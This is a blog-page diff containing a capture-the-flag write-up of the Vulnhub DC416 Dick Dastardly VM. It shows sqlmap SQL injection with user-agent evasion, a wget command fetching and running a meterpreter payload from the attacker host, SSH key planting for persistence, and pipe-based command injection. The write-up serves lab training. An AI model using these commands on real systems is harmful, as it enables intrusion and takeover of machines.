@@ -1,0 +1,523 @@
+<!doctype html>
+<html lang="en" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnhub - DC416: Dick Dastardly Writeup</title>
+    <meta name="description" content="Vulnhub - DC416: Dick Dastardly Writeup">
+    
+    <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, dickdastardly, dick dastardly">
+    
+    <meta name="author" content="Christian Mehlmauer">
+
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:site" content="@_FireFart_" />
+    <meta name="twitter:creator" content="@_FireFart_" />
+    
+    <meta name="twitter:title" content="Vulnhub - DC416: Dick Dastardly Writeup">
+    <meta name="twitter:description" content="Vulnhub - DC416: Dick Dastardly Writeup">
+    <meta property="og:title" content="Vulnhub - DC416: Dick Dastardly Writeup">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_dick_dastardly/" />
+    <meta property="og:description" content="Vulnhub - DC416: Dick Dastardly Writeup">
+    
+    <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
+    <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
+    
+    <meta property="og:updated_time" content="2017-01-10 23:00:00 &#43;0100 CET"/>
+    <meta property="article:author" content="https://twitter.com/_FireFart_"/>
+
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
+    <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
+
+    <link rel="stylesheet" href='https://firefart.at/css/all.min.css'>
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+    
+    
+    <script type="application/ld+json">
+    [
+      {
+        "@context" : "http://schema.org",
+        "@type" : "WebSite",
+        "name" : "FireFart",
+        "url" : "https://firefart.at"
+      },
+      {
+        "@context" : "http://schema.org",
+        "@type" : "Person",
+        "name" : "Christian Mehlmauer",
+        "url" : "https://firefart.at",
+        "sameAs" : [
+          "https://twitter.com/_FireFart_",
+          "https://github.com/FireFart",
+          "https://www.facebook.com/christian.mehlmauer"
+        ]
+      }
+    ]
+    </script>
+
+</head>
+<body>
+
+
+<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+    <div class="header">
+        <h1 class="brand-title"><a href="/">FireFart</a></h1>
+        <h2 class="brand-tagline"> that austrian security guy </h2>
+
+        <nav class="nav">
+            <ul class="nav-list">
+                
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href="https://twitter.com/_FireFart_">
+                        <i class="fa fa-twitter"></i> Twitter
+                    </a>
+                </li>
+                
+                
+                <li class="nav-item">
+                     <a class="pure-button" target="_blank" href="https://github.com/FireFart">
+                        <i class="fa fa-github-alt"></i> Github
+                    </a>
+                </li>
+                
+                
+                
+                <li class="nav-item">
+                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
+                </li>
+                <li class="nav-item">
+                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
+                        <i class="fa fa-rss"></i> rss
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+        <div>
+            
+            <div class="posts">
+                <h1 class="content-subhead">10 Jan 2017, 23:00</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="/post/vulnhub_dc416_dick_dastardly/" class="post-title">Vulnhub - DC416: Dick Dastardly Writeup</a>
+
+                        <p class="post-meta">
+                            
+                            
+                        </p>
+                    </header>
+
+                    <div id="toc" class="well col-md-4 col-sm-6">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#information-gathering">information gathering</a></li>
+<li><a href="#flag1">flag1</a></li>
+<li><a href="#flag2">flag2</a></li>
+<li><a href="#flag3">flag3</a></li>
+<li><a href="#flag0">flag0</a></li>
+<li><a href="#flags">flags</a></li>
+</ul>
+</nav>
+                    </div>
+
+                    <div class="post-description">
+                      <p>New evening, new VM: <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 Dick Dastardly</a> by the famous <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a>.</p>
+
+<p>Here are my other writeups for the DC416 challenges:</p>
+
+<ul>
+<li><a href="/post/vulnhub_dc416_basement/">DC416 Basement</a></li>
+<li><a href="/post/vulnhub_dc416_baffle/">DC416 Baffle</a></li>
+<li><a href="/post/vulnhub_dc416_fortress/">DC416 Fortress</a></li>
+</ul>
+
+<h1 id="information-gathering">information gathering</h1>
+
+<p>As every DC416 VM there is an information page hosted on port 80 with informations about it:</p>
+
+<pre><code>Engagement Rules:
+
+No username/password bruteforcing is necessary
+This box has 4 flags
+Flags are in flag{} format
+Have fun
+</code></pre>
+
+<p>So let&rsquo;s start with a nmap scan:</p>
+
+<pre><code>root@kali:~# nmap -sS -A -p- -T4 192.168.56.2
+Not shown: 65532 closed ports
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 03:26:f5:54:5b:15:37:ef:18:7e:08:cb:17:99:f3:16 (DSA)
+|   2048 38:98:af:53:dd:59:c4:a6:8e:a3:71:61:79:39:a5:ee (RSA)
+|_  256 4b:5e:ba:46:af:0f:75:dc:3d:2d:49:03:34:56:0c:31 (ECDSA)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: VulnHub
+6667/tcp filtered irc
+</code></pre>
+
+<p>We can see a filtered IRC port, SSH and an Apache Webserver.</p>
+
+<h1 id="flag1">flag1</h1>
+
+<p>The first flag can be found by simply inspecting the HTTP headers returned from the webserver on port 80.</p>
+
+<pre><code>root@kali:~# curl -skI 192.168.56.2
+HTTP/1.1 200 OK
+Date: Sun, 08 Jan 2017 21:48:34 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Last-Modified: Mon, 17 Oct 2016 16:04:49 GMT
+ETag: &quot;1eb-53f11bc50cf74&quot;
+Accept-Ranges: bytes
+Content-Length: 491
+Vary: Accept-Encoding
+Flag: flag1{l0l_h0w_345y_15_7h15_c7f}
+Content-Type: text/html
+</code></pre>
+
+<h1 id="flag2">flag2</h1>
+
+<p>By running nikto against the target we can see some requests return a PHP HTTP header so there must be a PHP application somewhere on the Server.</p>
+
+<pre><code>+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.20
+</code></pre>
+
+<p>So let&rsquo;s run <code>dirb</code> against the target and also check for files with an <code>.php</code> extension:</p>
+
+<pre><code>root@kali:~# dirb http://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
+-----------------
+GENERATED WORDS: 20458
+---- Scanning URL: http://192.168.56.2/ ----
++ http://192.168.56.2/admin.php (CODE:302|SIZE:0)
++ http://192.168.56.2/db.php (CODE:200|SIZE:0)
++ http://192.168.56.2/index.php (CODE:200|SIZE:647974)
++ http://192.168.56.2/report.php (CODE:200|SIZE:527)
+-----------------
+</code></pre>
+
+<p>After opening <code>index.php</code> in a browser we see a simple guestbook application and a feature to report issues under <code>report.php</code>.</p>
+
+<p><img src="/img/vulnhub_dc416_dick_dastardly/admin_login.png" alt="Admin Login" /></p>
+
+<p>By playing around with the parameters of the guestbook to see if it&rsquo;s vulnerable to XSS it seems that there is some filtering and escaping in place. So let&rsquo;s try <code>sqlmap</code> and see if it can find any SQL-Injection vulnerabilities.</p>
+
+<pre><code>sqlmap -u http://192.168.56.2/index.php --data &quot;name=asd&amp;msg=asd&quot; --level=5 --risk=3 --batch
+</code></pre>
+
+<p>After running this command I could not see any new entries on the guestbook page so it looks like all requests were blocked. <code>sqlmap</code> sends it&rsquo;s own user agent on every request containing the tool name so maybe the server is blocking these requests. The user agent can be randomized with the <code>--random-agent</code> option so let&rsquo;s give it another try:</p>
+
+<pre><code>sqlmap -u http://192.168.56.2/index.php --data &quot;name=asd&amp;msg=asd&quot; --level=5 --risk=3 --random-agent --batch
+</code></pre>
+
+<p>Bingo:</p>
+
+<pre><code>sqlmap identified the following injection point(s) with a total of 7776 HTTP(s) requests:
+---
+Parameter: name (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: name=asd'||(SELECT 'RbDO' FROM DUAL WHERE 4795=4795 AND SLEEP(5))||'&amp;msg=asd
+---
+</code></pre>
+
+<p>Let&rsquo;s also test the <code>report.php</code> file for SQL-Injection issues:</p>
+
+<pre><code>sqlmap -u http://192.168.56.2/report.php --data=&quot;issue=asdf&quot; --random-agent --level=5 --risk=3
+</code></pre>
+
+<pre><code>sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
+---
+Parameter: issue (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: issue=asdf'||(SELECT 'oYQt' FROM DUAL WHERE 9026=9026 AND 7350=7350)||'
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: issue=asdf'||(SELECT 'RdBC' FROM DUAL WHERE 9919=9919 AND SLEEP(5))||'
+---
+</code></pre>
+
+<p>So we have found 2 time based and one boolean based blind injection. We will use the vulnerability in <code>report.php</code> to dump the database as the boolean based blind attack is a lot faster then the time based attack.</p>
+
+<p>So let&rsquo;s enumerate the available DBs using the <code>--dbs</code> parameter:</p>
+
+<pre><code>available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] vulnhub
+</code></pre>
+
+<p>Now let&rsquo;s look at the <code>vulnhub</code> database with <code>-D vulnhub --tables</code>:</p>
+
+<pre><code>Database: vulnhub
+[3 tables]
++----------------------------------------------+
+| admins                                       |
+| guestbook                                    |
+| issues                                       |
++----------------------------------------------+
+</code></pre>
+
+<p>Then dump the admins table with <code>-D vulnhub -T admins --dump</code></p>
+
+<pre><code>Database: vulnhub
+Table: admins
+[1 entry]
++----+--------------------------------------+--------+
+| id | pass                                 | user   |
++----+--------------------------------------+--------+
+| 1  | 1b37y0uc4n76u3557h15p455w0rd,5uck3rz | rasta  |
++----+--------------------------------------+--------+
+</code></pre>
+
+<p>Yay! So we found the clear text password of <code>rasta</code> (even if it looks like md5 ;D ).</p>
+
+<p>Using the new login we can login on the web application and are presented with an admin application for the IRC server.</p>
+
+<p><img src="/img/vulnhub_dc416_dick_dastardly/admin_area.png" alt="Admin Area" /></p>
+
+<p>First we try to <code>Add IP to IRC whitelist</code> and see if this opens the IRC port for us. Success.</p>
+
+<pre><code>6667/tcp open  irc     IRCnet ircd
+| irc-info:
+|   users: 1
+|   servers: 1
+|   chans: 15
+|   lusers: 1
+|   lservers: 0
+|   server: irc.localhost
+|   version: 2.11.2p2. irc.localhost 000A
+|   uptime: 0 days, 0:53:58
+|   source ident: NONE or BLOCKED
+|   source host: 192.168.56.3
+|_  error: Closing Link: jgjxeujeu[~nmap@192.168.56.3] (&quot;&quot;)
+</code></pre>
+
+<p>We also have an option to add an <code>Supybot Owner</code> so lets add the user <code>test</code> with the password <code>test</code> but nothing happens. So we try to activate the <code>Supybot</code> and have a look at the IRC server.</p>
+
+<p>I installed <code>weechat</code> on my kali vm, started it and configured it the following way:</p>
+
+<pre><code>/server add vulnhub 192.168.56.2
+/connect vulnhub
+</code></pre>
+
+<p>By using <code>/list</code> we can get a list of all channels</p>
+
+<pre><code>21:10:08 vulnhub  -- | #vulnhub(1)
+21:10:08 vulnhub  -- | &amp;WALLOPS(1): SERVER MESSAGES: wallops received
+21:10:08 vulnhub  -- | &amp;SAVE(1): SERVER MESSAGES: save messages
+21:10:08 vulnhub  -- | &amp;AUTH(1): SERVER MESSAGES: messages from the authentication slave
+21:10:08 vulnhub  -- | &amp;SERVICES(1): SERVER MESSAGES: services joining and leaving
+21:10:08 vulnhub  -- | &amp;LOCAL(1): SERVER MESSAGES: notices about local connections
+21:10:08 vulnhub  -- | &amp;HASH(1): SERVER MESSAGES: hash tables growth
+21:10:08 vulnhub  -- | &amp;SERVERS(1): SERVER MESSAGES: servers joining and leaving
+21:10:08 vulnhub  -- | &amp;NUMERICS(1): SERVER MESSAGES: numerics received
+21:10:08 vulnhub  -- | &amp;CHANNEL(1): SERVER MESSAGES: fake modes
+21:10:08 vulnhub  -- | &amp;KILLS(1): SERVER MESSAGES: operator and server kills
+21:10:08 vulnhub  -- | &amp;NOTICES(1): SERVER MESSAGES: warnings and notices
+21:10:08 vulnhub  -- | &amp;ERRORS(1): SERVER MESSAGES: server errors
+21:10:08 vulnhub  -- | End of LIST
+</code></pre>
+
+<p>So let&rsquo;s join the <code>#vulnhub</code> channel with <code>/join #vulnhub</code>. We are seeing a user named <code>vulnhub-bot</code> which seems to be the bot we activated on the admin interface.</p>
+
+<p>We can now query the user to start a private conversation with it by issuing <code>/query vulnhub-bot</code>. After writing something we get the message</p>
+
+<pre><code>vulnhub-bot: Error: &quot;test&quot; is not a valid command.
+</code></pre>
+
+<p>By trying <code>help</code> we get a help menu:</p>
+
+<pre><code>21:21:00   -- | vulnhub-bot: (help [&lt;plugin&gt;] [&lt;command&gt;]) -- This command gives a useful description of what &lt;command&gt; does. &lt;plugin&gt; is only necessary if the command is in more than one plugin. You may also
+              | want to use the 'list' command to list all available plugins and commands.
+</code></pre>
+
+<p>So let&rsquo;s execute the mentioned <code>list</code> command:</p>
+
+<pre><code>21:21:13   -- | vulnhub-bot: Admin, AutoMode, Channel, Config, Misc, NickAuth, Owner, Unix, User, and Utilities
+</code></pre>
+
+<p>By looking at all the plugins in detail a <code>list Unix</code> reveals a <code>shell</code> method:</p>
+
+<pre><code>21:22:20   -- | vulnhub-bot: call, crypt, errno, fortune, pid, ping, ping6, progstats, shell, spell, sysuname, sysuptime, and wtf
+</code></pre>
+
+<p>So let&rsquo;s try the <code>shell</code> command:</p>
+
+<pre><code>22:25:16 root | Unix shell
+22:25:17   -- | vulnhub-bot: Error: You don't have the owner capability. If you think that you should have this capability, be sure that you are identified before trying again. The 'whoami' command can tell you
+              | if you're identified.
+</code></pre>
+
+<p>Crap, so <code>whoami</code>?</p>
+
+<pre><code>21:22:44 root | whoami
+21:22:44   -- | vulnhub-bot: I don't recognize you. You can message me either of these two commands: &quot;user identify &lt;username&gt; &lt;password&gt;&quot; to log in or &quot;user register &lt;username&gt; &lt;password&gt;&quot; to register.
+</code></pre>
+
+<p>Ok let&rsquo;s try the credentials from the user we added in the admin dialog:</p>
+
+<pre><code>21:23:16 root | user identify test test
+21:23:16   -- | vulnhub-bot: The operation succeeded.
+21:23:19 root | shell
+21:23:20   -- | vulnhub-bot: (shell &lt;command to call with any arguments&gt;) -- Calls any command available on the system using the shell specified by the SHELL environment variable, and returns its output.
+              | Requires owner capability. Note that being restricted to owner, this command does not do any sanity checking on input/output. So it is up to you to make sure you don't run anything that will
+              | spamify your channel or that will bring your (1 more message)
+</code></pre>
+
+<p>So let&rsquo;s download a meterpreter shell and start it:</p>
+
+<pre><code>shell &quot;/usr/bin/rm -f /tmp/meterpreter ; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter&quot;
+</code></pre>
+
+<pre><code>meterpreter &gt; sysinfo
+Computer     : 192.168.56.2
+OS           : Ubuntu 14.04 (Linux 3.13.0-101-generic)
+Architecture : x64
+Meterpreter  : x86/linux
+</code></pre>
+
+<p>Now we can get the next flag</p>
+
+<pre><code>cat flag2
+flag2{y0u'r3_4_5upyb07_n00b_m8}
+</code></pre>
+
+<p>Let&rsquo;s also add a SSH key to the <code>authorized_keys</code> so we can have a look with a proper shell as the user <code>rasta</code></p>
+
+<pre><code>mkdir ~/.ssh
+echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyXvfW0bhRfSIPDn6kHkn8qggMuDKTTMJEFweBWv7qJ5FKB+QbmfsjASOQPZBIsc6248pCUm3yfzfvRAUyXICD4Dcsz+Zex9TAKJFLc4W6dglZlEchOqFKWE8bpWHgzf4shFh/2/utcWtAxMJb+5+uYGyATBtjWeB3BsLVGaB3djow6ymxdl/V40qR/xOzfoO2U2mDJrG8iYPVkSHs2Rcfu0vnEb5XOWZ7qvhUgrmh/c/M5kNjH6f5/KJJkKXAfcMDwRV81EpznNOD2ddJxXBzgzpYU5zx21GDrTQE76N5NJR9L9ePtorVHWDAn8bfKo7K3Y2n4LjO8wL/cFVlXdd/ root@kali&quot; &gt; ~/.ssh/authorized_keys
+</code></pre>
+
+<h1 id="flag3">flag3</h1>
+
+<p>After having a look at the users sudo rights we can see we are allowed to run a python script as the user <code>vulnhub</code>:</p>
+
+<pre><code>rasta@DickDastardly:/home$ sudo -l
+Matching Defaults entries for rasta on DickDastardly:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rasta may run the following commands on DickDastardly:
+    (vulnhub) NOPASSWD: /usr/bin/python /usr/local/sbin/util.py
+</code></pre>
+
+<p>So let&rsquo;s try it out:</p>
+
+<pre><code>sudo -u vulnhub /usr/bin/python /usr/local/sbin/util.py
+</code></pre>
+
+<p>We get the <code>Admin Helper</code> application:</p>
+
+<pre><code> ----------------
+|  Admin Helper  |
+|	dev 0.1  |
+ ----------------
+
+1 whoami
+2 List Directory
+3 Coffee
+q Exit
+</code></pre>
+
+<p>With option 2 we are able to list any directory and it&rsquo;s also the only option accepting additional user input:</p>
+
+<pre><code>Please Select: 2
+
+Enter dir to list: /home/vulnhub/
+total 4
+-rw-r--r-- 1 root root 37 Sep 26 16:59 flag3
+</code></pre>
+
+<p>So maybe we can inject some commands here? After trying out various ways I noticed it is possible to execute commands with the <code>|</code> character:</p>
+
+<pre><code>Enter dir to list: / | id
+uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub)
+</code></pre>
+
+<p>Let&rsquo;s start the previously uploaded <code>meterpreter</code> again and watch a new connection coming in as the user <code>vulnhub</code>:</p>
+
+<pre><code>Enter dir to list: / | /tmp/meterpreter
+</code></pre>
+
+<p>Now we can get the next flag:</p>
+
+<pre><code>cat flag3
+flag3{n3x7_71m3_54n17153_y0ur_1npu7}
+</code></pre>
+
+<p>We can again add our SSH key to the user to get a better way to look at the machine.</p>
+
+<h1 id="flag0">flag0</h1>
+
+<p>After examining the output of <code>ps faux</code> there is a <code>ping</code> command running as <code>root</code>:</p>
+
+<pre><code>root      1046  0.0  0.1  17976  1480 ?        S    20:08   0:00 /bin/bash /root/ping.sh 2
+root      5463  0.0  0.0   6500   632 ?        S    21:44   0:00  \_ ping -c 1 -b 192.168.56.255 -p 725f796f755f6265636f6d655f746865 2
+</code></pre>
+
+<p>Decoding the data as hex reveals</p>
+
+<pre><code>&gt;&gt;&gt; &quot;725f796f755f6265636f6d655f746865&quot;.decode(&quot;hex&quot;)
+'r_you_become_the'
+</code></pre>
+
+<p>So this looks like the part of our flag. After looking at the process list again we can see the data portion of the ping command changes regularly.</p>
+
+<p>After extracting all values manually we can decode the last flag:</p>
+
+<pre><code>666c6167307b7468655f717569657465
+725f796f755f6265636f6d655f746865
+5f6d6f72655f796f755f6172655f6162
+6c655f746f5f686561727d
+
+&gt;&gt;&gt; &quot;666c6167307b7468655f717569657465725f796f755f6265636f6d655f7468655f6d6f72655f796f755f6172655f61626c655f746f5f686561727d&quot;.decode(&quot;hex&quot;)
+'flag0{the_quieter_you_become_the_more_you_are_able_to_hear}'
+</code></pre>
+
+<h1 id="flags">flags</h1>
+
+<p>The flags:</p>
+
+<pre><code>flag0{the_quieter_you_become_the_more_you_are_able_to_hear}
+flag1{l0l_h0w_345y_15_7h15_c7f}
+flag2{y0u'r3_4_5upyb07_n00b_m8}
+flag3{n3x7_71m3_54n17153_y0ur_1npu7}
+</code></pre>
+                    </div>
+                </section>
+            </div>
+            <div class="footer">
+    <div class="pure-menu pure-menu-horizontal pure-menu-open">
+        <ul>
+            <li>Copyright by Christian Mehlmauer</li>
+            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+        </ul>
+    </div>
+</div>
+<script type="text/javascript" src='https://firefart.at/js/all.min.js'></script>
+<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
+
+<script type="text/javascript" src='https://firefart.at/js/anal.js'></script>
+<noscript><p><img src="//firefart.at/pi.php?idsite=1" style="border:0;" alt="placeholder" /></p></noscript>
+
+
+        </div>
+    </div>
+</div>
+</body>
+</html>
